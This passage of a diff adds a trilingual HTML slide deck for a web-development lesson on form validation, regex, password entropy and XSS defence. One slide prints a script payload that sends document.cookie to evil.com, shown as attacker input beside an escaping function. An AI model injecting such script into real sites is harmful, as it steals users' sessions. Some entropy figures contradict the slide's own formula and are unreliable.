+          <li><code>[A-Z]</code> — <span class="t" data-ru="Хотя бы одна заглавная буква" data-en="At least one uppercase character">Katta harf oraliqlari</span></li>
+        </ul>
+      </div>
+      <div class="box">
+        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Методы Regex в JS" data-en="Regex Methods in JS">JS-da Regex Metodlari</div>
+        <pre><code class="language-javascript">// 1. Qat'iy tekshirish (true/false)
+const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+console.log(emailRegex.test("user@target.uz")); // true
+
+// 2. Mos keluvchini qidirish
+const phoneRegex = /\+998\d{9}/;
+const match = "+998901234567".match(phoneRegex);
+
+// 3. Tozalash va almashtirish (Sanitize)
+const clean = dirtyStr.replace(/<[^>]*>/g, "");</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 5: EMAIL, PHONE & PASSWORD PATTERNS -->
+  <section class="slide" data-phase="Nazariya|Теория|Theory" data-time="20:00–25:00" data-slide-index="4">
+    <div class="eyebrow"><span class="t" data-ru="БОЕВЫЕ ШАБЛОНЫ" data-en="PRODUCTION PATTERNS">AMALIY ISHCHI QOLIPLAR</span></div>
+    <h2 data-ru="3 Главных Шаблона: Email, Телефон Узбекистана и Пароль" data-en="3 Production Regexes: Email, UZ Phone & Strong Passwords">3 Asosiy Amaliy Qolip: Email, O'zbekiston Telefoni va Parol</h2>
+    <div class="grid-3">
+      <div class="box">
+        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);">1. Email Qolipi</div>
+        <pre><code class="language-javascript">/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/</code></pre>
+        <p style="font-size:11px; color:var(--ink-2);" data-ru="Проверяет наличие имени, символа @, домена и зоны не менее 2 букв (.uz, .com)." data-en="Enforces username characters, single @, valid domain, and TLD of at least 2 chars (.uz, .com).">Foydalanuvchi nomi, bitta @ belgisi, domen va kamida 2 harfli TLD (.uz, .com) mavjudligini kafolatlaydi.</p>
+      </div>
+      <div class="box">
+        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);">2. Telefon (+998)</div>
+        <pre><code class="language-javascript">/^\+998(9[0-9]|33|88)\d{7}$/</code></pre>
+        <p style="font-size:11px; color:var(--ink-2);" data-ru="Только корректные префиксы операторов Узбекистана (90, 91, 93, 94, 97, 99, 33, 88) и ровно 7 цифр." data-en="Matches only valid Uzbek operator prefixes (90, 91, 99, 33, 88) followed by exactly 7 digits.">Faqat O'zbekiston aloqa operatorlari kodlari (90, 91, 99, 33, 88) va undan keyin roppa-rosa 7 ta raqam.</p>
+      </div>
+      <div class="box">
+        <div class="tag" style="background:rgba(168,85,247,0.15); color:var(--purple);">3. Kuchli Parol</div>
+        <pre><code class="language-javascript">/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*]).{8,}$/</code></pre>
+        <p style="font-size:11px; color:var(--ink-2);" data-ru="Lookahead проверки: минимум 8 символов, заглавная, строчная буква, цифра и спецсимвол." data-en="Lookahead asserts: 8+ chars, lowercase, uppercase, digit, and special cyber character.">Positive lookahead: kamida 8 ta belgi, bitta katta harf, bitta kichik harf, bitta raqam va maxsus belgi.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 6: PASSWORD ENTROPY -->
+  <section class="slide" data-phase="Kiberxavfsizlik|Кибербезопасность|Security" data-time="25:00–29:00" data-slide-index="5">
+    <div class="eyebrow"><span class="t" data-ru="МАТЕМАТИКА БЕЗОПАСНОСТИ" data-en="SECURITY MATH">KIBER-MATEMATIKA</span></div>
+    <h2 data-ru="Энтропия Пароля: Сколько Бит Нужно Против Brute-Force?" data-en="Password Entropy: How Many Bits Resist Brute-Force?">Parol Entropiyasi: Brute-Force Hujumiga Qancha Bit Kerak?</h2>
+    <div class="grid-2">
+      <div class="box">
+        <div class="tag" data-ru="Формула Шеннона" data-en="Shannon Formula">Entropiya Formulasi</div>
+        <div style="font-size:16px; font-family:monospace; color:var(--accent); margin:10px 0; font-weight:700;">E = L × log₂(R)</div>
+        <ul style="font-size:12px; line-height:1.7;">
+          <li><strong>L:</strong> <span class="t" data-ru="Длина пароля (количество символов)" data-en="Password length (character count)">Parol uzunligi (belgilar soni)</span></li>
+          <li><strong>R:</strong> <span class="t" data-ru="Пул символов (10 цифр, 26 букв, 32 спецсимвола = 94)" data-en="Character pool size (digits 10, letters 26+26, symbols 32 = 94)">Belgilar to'plami (raqamlar 10, harflar 52, belgilar 32 = 94)</span></li>
+          <li><strong>E &lt; 40 bit:</strong> <span style="color:var(--red);" data-ru="Слабый пароль, взламывается за минуты" data-en="Weak password, cracked in minutes">Juda zaif, bir necha daqiqada buziladi</span></li>
+          <li><strong>E &gt; 60 bit:</strong> <span style="color:var(--green); font-weight:700;" data-ru="Надежный kiber-parol (миллионы лет перебора)" data-en="Resilient password (millions of years to crack)">Kiber-mustahkam (millionlab yillar kerak)</span></li>
+        </ul>
+      </div>
+      <div class="box" style="border:1px solid var(--accent);">
+        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Таблица Стойкости" data-en="Crack Time Comparison">Buzilish Vaqtlari Taqqoslash</div>
+        <table style="width:100%; border-collapse:collapse; font-size:11px; margin-top:8px;">
+          <tr style="border-bottom:1px solid var(--hair);">
+            <th style="padding:4px;" data-ru="Пароль" data-en="Password">Parol</th>
+            <th style="padding:4px;" data-ru="Длина / Пул" data-en="Length / Pool">Uzunlik / Pool</th>
+            <th style="padding:4px;" data-ru="Энтропия" data-en="Entropy">Entropiya</th>
+            <th style="padding:4px;" data-ru="Время Взлома (RTX 4090)" data-en="Crack Time (RTX 4090)">Buzilish Vaqti</th>
+          </tr>
+          <tr style="border-bottom:1px dashed var(--hair); color:var(--red);">
+            <td style="padding:4px;" data-ru="target2026" data-en="target2026">target2026</td>
+            <td style="padding:4px;" data-ru="10 символов (буква+цифра)" data-en="10 chars (alphanumeric)">10 belgi (harf+son)</td>
+            <td style="padding:4px;" data-ru="33 бита" data-en="33 bits">33 bit</td>
+            <td style="padding:4px;" data-ru="0.02 секунды" data-en="0.02 seconds">0.02 soniya</td>
+          </tr>
+          <tr style="border-bottom:1px dashed var(--hair); color:var(--yellow);">
+            <td style="padding:4px;" data-ru="Target#2026" data-en="Target#2026">Target#2026</td>
+            <td style="padding:4px;" data-ru="11 символов (+заглавная+символ)" data-en="11 chars (+upper+symbol)">11 belgi (+katta+simvol)</td>
+            <td style="padding:4px;" data-ru="48 бит" data-en="48 bits">48 bit</td>
+            <td style="padding:4px;" data-ru="3 дня" data-en="3 days">3 kun</td>
+          </tr>
+          <tr style="color:var(--green); font-weight:700;">
+            <td style="padding:4px;" data-ru="K!ber#T@rget$2026" data-en="K!ber#T@rget$2026">K!ber#T@rget$2026</td>
+            <td style="padding:4px;" data-ru="17 символов (полный пул)" data-en="17 chars (full pool)">17 belgi (to'liq pool)</td>
+            <td style="padding:4px;" data-ru="82 бита" data-en="82 bits">82 bit</td>
+            <td style="padding:4px;" data-ru="400 миллионов лет!" data-en="400 million years!">400 million yil!</td>
+          </tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 7: XSS SANITIZATION -->
+  <section class="slide" data-phase="Kiberxavfsizlik|Кибербезопасность|Security" data-time="29:00–33:00" data-slide-index="6">
+    <div class="eyebrow"><span class="t" data-ru="ЗАЩИТА ОТ ИНЪЕКЦИЙ" data-en="INJECTION DEFENSE">XSS VA KIBER-HIMOYA</span></div>
+    <h2 data-ru="Санитизация Данных: Защита от XSS (Cross-Site Scripting)" data-en="Data Sanitization: Defending Against XSS Attacks">Ma'lumotlarni Tozalash: XSS Hujumlarini Bartaraf Qilish</h2>
+    <div class="grid-2">
+      <div class="box danger-border">
+        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--red);" data-ru="Хакерский Ввод (Stored XSS)" data-en="Hacker Payload (Stored XSS)">Xakerlik Kiritmasi (XSS Payload)</div>
+        <p style="font-size:12px;" data-ru="Злоумышленник в поле «Имя» вводит вредоносный JavaScript-код:" data-en="Attacker enters malicious JavaScript code into the user name field:">Hujumchi "Ism" maydoniga quyidagi yovuz kodni kiritadi:</p>
+        <pre><code class="language-html">&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
+&lt;img src="x" onerror="alert('Buzildi!')" /&gt;</code></pre>
+        <p style="font-size:11px; color:var(--red);" data-ru="Если вставить это через `innerHTML`, браузер выполнит скрипт и украдет JWT-токены пользователей!" data-en="Injecting this via `innerHTML` executes the script immediately, stealing session tokens!">Agar bu matn `innerHTML` orqali ekranga chiqarilsa, brauzer darhol skriptni bajaradi va foydalanuvchining barcha tokenlarini o'g'irlaydi!</p>
+      </div>
+      <div class="box" style="border:1px solid var(--green);">
+        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="Золотой Стандарт Санитизации" data-en="Sanitization Standard">Oltin Standart: Tozalash Moduli</div>
+        <p style="font-size:12px;" data-ru="1. Никогда не используйте `innerHTML` для пользовательского ввода, только `textContent`!<br>2. Экранируйте опасные символы перед сохранением:" data-en="1. Never render user inputs via `innerHTML`, use `textContent`!<br>2. Escape dangerous HTML entities prior to saving:">1. Foydalanuvchi kiritmasini hech qachon `innerHTML` bilan ko'rsatmang, faqat `textContent`!<br>2. Xavfli belgilarni maxsus HTML obyektlariga almashtiring:</p>
+        <pre><code class="language-javascript">function sanitizeHTML(str) {
+  const map = {
+    '&': '&amp;', '<': '&lt;', '>': '&gt;',
+    '"': '&quot;', "'": '&#x27;', '/': '&#x2F;'
+  };
+  return str.replace(/[&<>"'/]/g, s => map[s]);
+}</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 8: SMARTBOARD INTERACTIVE DEMO -->
+  <section class="slide" data-phase="Jonli Sinov|Живой Тест|Live Test" data-time="33:00–37:00" data-slide-index="7">
+    <div class="eyebrow"><span class="t" data-ru="ИНТЕРАКТИВНЫЙ ТРЕНАЖЕР" data-en="INTERACTIVE SIMULATOR">SMARTBOARD BOSHQARUVI</span></div>
+    <h2 data-ru="Живой Тестер Валидации: Проверь Пароль и Email" data-en="Live Validation Tester: Test Passwords & Emails">Jonli Validatsiya Sinovi: Email va Parolni Sinab Ko'ring</h2>
+    <div style="background:var(--surface); border:1px solid var(--hair); border-radius:8px; padding:12px; margin-top:8px;">
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
+        <div>
+          <label style="font-size:11px; font-weight:700; color:var(--accent);" data-ru="Email Адрес:" data-en="Email Address:">Email Manzili:</label>
+          <input id="demoEmail" type="text" placeholder="user@target.uz" data-placeholder-ru="user@target.uz" data-placeholder-en="user@target.uz" oninput="testDemoEmail()" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #334155; color:#fff; padding:6px 10px; border-radius:4px; font-size:12px; margin-top:4px;" />
+          <div id="demoEmailStatus" style="font-size:11px; margin-top:4px; font-weight:700; color:#64748b;" data-ru="Введите email..." data-en="Enter email...">Email kiriting...</div>
+
+          <label style="font-size:11px; font-weight:700; color:var(--purple); margin-top:10px; display:block;" data-ru="Пароль (Проверка Энтропии):" data-en="Password (Entropy Test):">Parol (Entropiya Sinovi):</label>
+          <input id="demoPass" type="text" placeholder="Kiber#Parol2026" data-placeholder-ru="Kiber#Parol2026" data-placeholder-en="Kiber#Parol2026" oninput="testDemoPassword()" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #334155; color:#fff; padding:6px 10px; border-radius:4px; font-size:12px; margin-top:4px;" />
+          <div style="width:100%; height:6px; background:#1e293b; border-radius:3px; margin-top:6px; overflow:hidden;">
+            <div id="demoEntropyBar" style="width:0%; height:100%; background:#ef4444; transition:width 0.2s, background 0.2s;"></div>
+          </div>
+          <div id="demoPassStatus" style="font-size:11px; margin-top:4px; font-weight:700; color:#64748b;" data-ru="Энтропия: 0 бит" data-en="Entropy: 0 bits">Entropiya: 0 bit</div>
+        </div>
+
+        <div style="background:#090d16; border:1px solid #1e293b; border-radius:6px; padding:10px; font-family:monospace; font-size:11px;">
+          <div style="color:var(--accent); font-weight:700; margin-bottom:6px;" data-ru="🛡️ XSS Санитизатор (Live Output):" data-en="🛡️ XSS Sanitizer (Live Output):">🛡️ XSS Sanitize Natijasi:</div>
+          <div style="color:#64748b; font-size:10px;" data-ru="Введите вредоносный &lt;script&gt; в поле пароля:" data-en="Type a malicious &lt;script&gt; into the password field:">Parol maydoniga yovuz &lt;script&gt; yozib ko‘ring:</div>
+          <div id="demoSanitizedOutput" style="background:#111827; padding:8px; border-radius:4px; margin-top:6px; color:#10b981; word-break:break-all; min-height:60px;">Tozalangan matn shu yerda chiqadi...</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 9: QUICK QUIZ -->
+  <section class="slide" data-phase="Viktorina|Викторина|Quiz" data-time="37:00–39:00" data-slide-index="8">
+    <div class="eyebrow"><span class="t" data-ru="ЭКСПРЕСС-ТЕСТ" data-en="RAPID QUIZ">TEZKOR TEST</span></div>
+    <h2 data-ru="3 Вопроса по Regex и Безопасности Форм" data-en="3 Questions on Regex & Form Cyber Hygiene">Regex va Forma Xavfsizligi Bo'yicha 3 Savol</h2>
+    <div class="grid-3">
+      <div class="box">
+        <div class="tag">Savol 1</div>
+        <h4 data-ru="Какое событие лучше всего подходит для мгновенной валидации?" data-en="Which event is best suited for real-time validation?">Real-vaqtda validatsiya uchun qaysi hodisa eng mos keladi?</h4>
+        <div style="font-size:11px; margin-top:6px; line-height:1.5;">
+          <div>A) <code>click</code></div>
+          <div style="color:var(--green); font-weight:700;">B) <code>input</code> (har bir harfda)</div>
+          <div>C) <code>unload</code></div>
+        </div>
+      </div>
+      <div class="box">
+        <div class="tag">Savol 2</div>
+        <h4 data-ru="Что означает квантификатор {8,} в регулярном выражении?" data-en="What does the quantifier {8,} assert in regex?">Regex qolipidagi <code>{8,}</code> nimani bildiradi?</h4>
+        <div style="font-size:11px; margin-top:6px; line-height:1.5;">
+          <div>A) Roppa-rosa 8 ta belgi</div>
+          <div style="color:var(--green); font-weight:700;">B) Kamida 8 ta yoki undan ko'p belgi</div>
+          <div>C) 8 ta bo'sh joy</div>
+        </div>
+      </div>
+      <div class="box">
+        <div class="tag">Savol 3</div>
+        <h4 data-ru="Как безопаснее всего отображать пользовательский текст?" data-en="How to safely render untrusted user text in DOM?">DOM-da matnni XSS-dan xoli xavfsiz ko'rsatish yo'li qaysi?</h4>
+        <div style="font-size:11px; margin-top:6px; line-height:1.5;">
+          <div>A) <code>element.innerHTML</code></div>
+          <div style="color:var(--green); font-weight:700;">B) <code>element.textContent</code></div>
+          <div>C) <code>document.write()</code></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 10: SUMMARY & HOMEWORK -->
+  <section class="slide" data-phase="Xulosa|Итоги|Summary" data-time="39:00–40:00" data-slide-index="9">
+    <div class="eyebrow"><span class="t" data-ru="ИТОГИ И ДОМАШНЕЕ ЗАДАНИЕ" data-en="SUMMARY & HOMEWORK">XULOSA VA UY VAZIFASI</span></div>
+    <h2 data-ru="Итоги 34-Урока и Домашний Проект" data-en="Lesson 34 Takeaways & Homework Assignment">34-Dars Xulosalari va Kiber-Forma Loyihasi</h2>
+    <div class="grid-2">
+      <div class="box">
+        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Домашнее Задание" data-en="Homework Assignment">Uy Vazifasi (vazifa.html)</div>
+        <p style="font-size:12px; line-height:1.6;" data-ru="<strong>1-Уровень (4 б):</strong> Написать Regex для проверки почты и телефона Узбекистана.<br><strong>2-Уровень (4 б):</strong> Создать живую форму с подсчетом энтропии пароля на событии <code>input</code>.<br><strong>3-Уровень (2 б):</strong> Внедрить функцию <code>sanitizeHTML()</code>, нейтрализующую теги &lt;script&gt;." data-en="<strong>Tier 1 (4 pts):</strong> Formulate Regex patterns for email and Uzbek mobile phone.<br><strong>Tier 2 (4 pts):</strong> Implement a live form computing password entropy via <code>input</code> listeners.<br><strong>Tier 3 (2 pts):</strong> Code a <code>sanitizeHTML()</code> entity escaping module neutralizing &lt;script&gt; tags."><strong>1-Daraja (4 b):</strong> Email va O'zbekiston telefoni uchun Regex qoliplarini yozish.<br><strong>2-Daraja (4 b):</strong> <code>input</code> hodisasida parol entropiyasini hisoblovchi jonli forma yaratish.<br><strong>3-Daraja (2 b):</strong> &lt;script&gt; teglarini zararsizlantiruvchi <code>sanitizeHTML()</code> funksiyasini yozish.</p>
+      </div>
+      <div class="box" style="border:1px solid var(--accent);">
+        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="Анонс 35-Урока" data-en="Next Lesson 35">Keyingi Dars (35-Dars)</div>
+        <h4 data-ru="Экосистема NPM и Безопасность Сторонних Пакетов" data-en="NPM Ecosystem & Supply Chain Security">NPM Ekotizimi va Tashqi Paketlar Xavfsizligi</h4>
+        <p style="font-size:12px;" data-ru="В следующий раз мы разберем пакетный менеджер Node.js, семантическое версионирование, команду <code>npm audit</code> и защиту от вредоносных библиотек (Supply Chain Attacks)!" data-en="Next time we dive into the Node.js package manager, semantic versioning (^, ~), <code>npm audit</code>, and defense against poisoned open-source libraries (Supply Chain Attacks)!">Keyingi darsimizda Node.js paketlar menejeri, semantik versiyalash (^, ~), <code>npm audit</code> va zaharli ochiq-kodli kutubxonalardan himoyalanishni o'rganamiz!</p>
+      </div>
+    </div>
+  </section>
+
+  </div><!-- /stage -->
+
+<!-- ============================================================
+     BOTTOM-RIGHT FLOATING GLASS DOCK
+     ============================================================ -->
+<div class="floating-dock">
+  <button class="dock-btn nav-btn" onclick="prevSlide()" title="Oldingi slayd (←)" data-title-ru="Предыдущий слайд (←)" data-title-en="Previous slide (←)" aria-label="Oldingi slayd">
+    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"/></svg>
+  </button>
+  <button class="dock-btn nav-btn" onclick="nextSlide()" title="Keyingi slayd (→)" data-title-ru="Следующий слайд (→)" data-title-en="Next slide (→)" aria-label="Keyingi slayd">
+    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg>
+  </button>
+  <span style="width:1px; height:16px; background:var(--rule); margin:0 2px;"></span>
+  <button class="dock-btn lang-btn is-active" data-lang="uz" onclick="setLang('uz')">UZ</button>
+  <button class="dock-btn lang-btn" data-lang="ru" onclick="setLang('ru')">RU</button>
+  <button class="dock-btn lang-btn" data-lang="en" onclick="setLang('en')">EN</button>
+  <span style="width:1px; height:16px; background:var(--rule); margin:0 2px;"></span>
+  <button class="dock-btn" onclick="adjustScale(-0.1)" title="Masshtabni kichraytirish (-)" data-title-ru="Уменьшить масштаб (-)" data-title-en="Zoom out (-)" aria-label="Masshtabni kichraytirish">
+    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><line x1="5" y1="12" x2="19" y2="12"/></svg>
+  </button>
+  <button class="dock-btn scale-label-btn" onclick="cycleScale()" title="Masshtabni o'zgartirish yoki tiklash (0)" data-title-ru="Сменить или сбросить масштаб (0)" data-title-en="Cycle or reset scale (0)" aria-label="Masshtab">
+    <span id="scaleLabel">100%</span>
+  </button>
+  <button class="dock-btn" onclick="adjustScale(0.1)" title="Masshtabni kattalashtirish (+)" data-title-ru="Увеличить масштаб (+)" data-title-en="Zoom in (+)" aria-label="Masshtabni kattalashtirish">
+    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+  </button>
+  <span style="width:1px; height:16px; background:var(--rule); margin:0 2px;"></span>
+  <button class="dock-btn" onclick="toggleTheme()" title="Mavzuni almashtirish" data-title-ru="Сменить тему" data-title-en="Toggle Theme" aria-label="Mavzu">
+    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 3v18a9 9 0 0 0 0-18z" fill="currentColor"/></svg>
+  </button>
+  <button class="dock-btn" onclick="toggleNotes()" title="O'qituvchi izohlari (N)" data-title-ru="Заметки преподавателя (N)" data-title-en="Teacher Notes (N)" aria-label="Izohlar">
+    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+  </button>
+  <button class="dock-btn" onclick="toggleHelp()" title="Klavishlar yordami (?)" data-title-ru="Справка клавиш (?)" data-title-en="Keyboard Help (?)" aria-label="Yordam">
+    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="6" y1="8" x2="6.01" y2="8"/><line x1="10" y1="8" x2="10.01" y2="8"/><line x1="14" y1="8" x2="14.01" y2="8"/><line x1="18" y1="8" x2="18.01" y2="8"/><line x1="6" y1="12" x2="6.01" y2="12"/><line x1="18" y1="12" x2="18.01" y2="12"/><line x1="7" y1="16" x2="17" y2="16"/></svg>
+  </button>
+</div>
+
+<!-- ============================================================
+     TEACHER NOTES DRAWER
+     ============================================================ -->
+<div class="notes-drawer" id="notesDrawer">
+  <div class="notes-head">
+    <div class="notes-title" data-ru="Конспект Преподавателя и Методика" data-en="Teacher Lesson Notes">O'qituvchi Konspekti va Metodika</div>
+    <button class="dock-btn" onclick="toggleNotes()">✕</button>
+  </div>
+  <div class="notes-content" id="notesContent">
+    <!-- Dynamically loaded per slide -->
+  </div>
+</div>
+
+<!-- ============================================================
+     KEYBOARD HELP MODAL
+     ============================================================ -->
+<div class="modal-overlay" id="helpModal" onclick="if(event.target===this) toggleHelp()">
+  <div class="modal-card">
+    <h3 data-ru="Горячие Клавиши и Навигация" data-en="Keyboard & Touch Navigation">Klaviatura va Boshqaruv Qisqa Yo'llari</h3>
+    <div class="help-grid">
+      <div><kbd>→</kbd> / <kbd>Space</kbd></div>
+      <div data-ru="Следующий слайд" data-en="Next slide">Keyingi slayd</div>
+      <div><kbd>←</kbd></div>
+      <div data-ru="Предыдущий слайд" data-en="Previous slide">Oldingi slayd</div>
+      <div><kbd>L</kbd></div>
+      <div data-ru="Переключение языка (UZ → RU → EN)" data-en="Cycle languages (UZ → RU → EN)">Tilni almashtirish (UZ → RU → EN)</div>
+      <div><kbd>T</kbd></div>
+      <div data-ru="Светлая / Темная тема" data-en="Toggle dark / light theme">Yorug' / Qorong'i mavzu</div>
+      <div><kbd>N</kbd></div>
+      <div data-ru="Методические заметки преподавателя" data-en="Toggle teacher lesson notes">O'qituvchi metodik izohlari</div>
+      <div><kbd>?</kbd></div>
+      <div data-ru="Справка горячих клавиш" data-en="Open this shortcut guide">Ushbu yordam panelini ochish</div>
+      <div><kbd>Esc</kbd></div>
+      <div data-ru="Закрыть панель или окно" data-en="Close modal or drawer">Izoh yoki oynani yopish</div>
+      <div><kbd>+</kbd> / <kbd>-</kbd> / <kbd>0</kbd></div>
+      <div data-ru="Масштаб (увеличить / уменьшить / 100%)" data-en="Presentation scale (zoom in / zoom out / reset)">Prezentatsiya masshtabi (kattalashtirish / kichraytirish / 100%)</div>
+    </div>
+    <p style="font-size:13px; color:var(--ink-3);" data-ru="💡 На смартбордах: Смахивайте пальцем вправо/влево для навигации. Масштабируйте двумя пальцами (pinch-to-zoom) или кнопками в правом нижнем углу." data-en="💡 Touch Smartboards: Swipe horizontally to navigate. Pinch with two fingers (pinch-to-zoom) or use dock buttons to scale.">💡 Sensorli doskalarda: Slaydlar orasida o'tish uchun barmog'ingiz bilan suring. Masshtabni ikki barmoq bilan (pinch-to-zoom) yoki o'ng pastdagi tugmalar bilan o'zgartiring.</p>
+  </div>
+</div>
+
+<!-- ============================================================
+     CANONICAL JAVASCRIPT CONTROLLER (100% Battle-Tested)
+     ============================================================ -->
+<script>
+var slides = document.querySelectorAll(".slide");
+var total = slides.length;
+var currentLang = "uz";
+document.getElementById("totalSlides").textContent = total;
+
+// URL Query Parameter & Hash Navigation Engine (?slide=X or #X)
+function getSlideFromURL() {
+  try {
+    var params = new URLSearchParams(window.location.search);
+    var slideParam = params.get("slide") || params.get("p");
+    if (slideParam) {
+      var n = parseInt(slideParam, 10);
+      if (!isNaN(n) && n >= 1 && n <= total) return n - 1;
+    }
+    var hash = window.location.hash || "";
+    var match = hash.match(/(?:#|#slide-)(\d+)/);
+    if (match) {
+      var hn = parseInt(match[1], 10);
+      if (!isNaN(hn) && hn >= 1 && hn <= total) return hn - 1;
+    }
+    var sess = sessionStorage.getItem("target_session_slide_" + window.location.pathname);
+    if (sess) {
+      var sn = parseInt(sess, 10);
+      if (!isNaN(sn) && sn >= 0 && sn < total) return sn;
+    }
+  } catch(e) {}
+  return 0;
+}
+
+function syncSlideToURL(push) {
+  try {
+    sessionStorage.setItem("target_session_slide_" + window.location.pathname, currentSlide.toString());
+    var url = new URL(window.location.href);
+    url.searchParams.set("slide", currentSlide + 1);
+    if (push) {
+      history.pushState({ slide: currentSlide }, "", url.toString());
+    } else {
+      history.replaceState({ slide: currentSlide }, "", url.toString());
+    }
+  } catch(e) {}
+}
+
+var currentSlide = getSlideFromURL();
+
+var TITLES = {
+  "uz": "34-dars: Formalar, Regex va Real-Vaqt Kiber-Validatsiya",
+  "ru": "Урок 34: Формы, Регулярные Выражения и Кибер-Валидация",
+  "en": "Lesson 34: Interactive Forms, Regex & Real-Time Cyber Validation"
+};
+
+var NOTES = {
+  "uz": [
+    [
+      "Kirish va Maqsad",
+      "O'quvchilarga bugungi mavzu: Formalar, Regex va real-vaqt kiber-validatsiyasi ekanini e'lon qiling.",
+      "Doskaga POST reload vs SPA 0ms taqqoslashini chizing."
+    ],
+    [
+      "Uy Vazifasi Tahlili",
+      "33-darsdagi SPA routerda F5 bosilganda 404 xatosi chiqishi (Vercel rewrite yo'qligi) sababini tushuntiring.",
+      "Oltin yechim: barcha yo'llarni index.html ga yo'naltirish ekanini ayting."
+    ],
+    [
+      "Klassik Formalar Muammosi",
+      "Nega sahifani qayta yuklash foydalanuvchini charchatishini tushuntiring.",
+      "e.preventDefault() va input hodisasi afzalligini ko'rsating."
+    ],
+    [
+      "Regex Sintaksisi",
+      "Muntazam ifodalarning asosiy meta-belgilarini doskaga yozing (^, $, \\d, \\w, +, {8,}).",
+      "O'quvchilar bilan test() metodini ko'rib chiqing."
+    ],
+    [
+      "Amaliy Qoliplar",
+      "Email, +998 telefon va parol qoliplarini slayd orqali tahlil qiling.",
+      "O'quvchilarga O'zbekiston operatorlari prefikslarini eslatib o'ting."
+    ],
+    [
+      "Parol Entropiyasi",
+      "Shennon formulasi: E = L * log2(R) orqali kiber-mustahkamlikni tushuntiring.",
+      "RTX 4090 videokartasida parollarni buzish vaqtlarini solishtiring."
+    ],
+    [
+      "XSS Sanitizatsiya",
+      "Foydalanuvchi kiritmasini to'g'ridan-to'g'ri innerHTML bilan chiqarish falokat ekanini ko'rsating.",
+      "sanitizeHTML funksiyasini yozishni o'rgating."
+    ],
+    [
+      "Smartboard Sinovi",
+      "Doskadagi simulyatorda email va parollarni kiritib ko'rsating.",
+      "O'quvchini doskaga chiqarib <script> inyeksiyasini tozalab ko'rishni buyuring."
+    ],
+    [
+      "Tezkor Viktorina",
+      "3 ta nazorat savoli orqali mavzuni mustahkamlang.",
+      "To'g'ri javob berganlarga rag'bat ballari qo'ying."
+    ],
+    [
+      "Xulosa va Vazifa",
+      "Darsni xulosalang va uy vazifasini belgilang.",
+      "Keyingi NPM va paketlar xavfsizligi mavzusiga qiziqish uyg'oting."
+    ]
+  ],
+  "ru": [
+    [
+      "Введение и Цель",
+      "Объявите тему: интерактивные формы, регулярные выражения Regex и кибер-валидация.",
+      "Нарисуйте на доске сравнение POST refresh против SPA 0ms."
+    ],
+    [
+      "Разбор ДЗ 33",
+      "Объясните ошибку 404 при нажатии F5 в SPA и отсутствие rewrites.",
+      "Напомните про перенаправление всех путей на index.html."
+    ],
+    [
+      "Проблема Классических Форм",
+      "Объясните, почему перезагрузка страниц ушла в прошлое.",
+      "Покажите преимущества e.preventDefault() и события input."
+    ],
+    [
+      "Синтаксис Regex",
+      "Разберите метасимволы регулярных выражений (^, $, \\d, \\w, +, {8,}).",
+      "Продемонстрируйте работу метода RegExp.test()."
+    ],
+    [
+      "Боевые Шаблоны",
+      "Разберите регулярки для email, номеров Узбекистана и паролей.",
+      "Объясните логику positive lookahead."
+    ],
+    [
+      "Энтропия Пароля",
+      "Объясните формулу Шеннона E = L * log2(R).",
+      "Сравните скорость перебора паролей на современных GPU."
+    ],
+    [
+      "XSS Санитизация",
+      "Покажите опасность прямого использования innerHTML.",
+      "Научите экранировать спецсимволы в функции sanitizeHTML."
+    ],
+    [
+      "Смартборд Тест",
+      "Запустите интерактивную проверку email и пароля на смартборде.",
+      "Пригласите ученика протестировать нейтрализацию <script>."
+    ],
+    [
+      "Экспресс-Тест",
+      "Проведите экспресс-опрос по 3 вопросам слайда.",
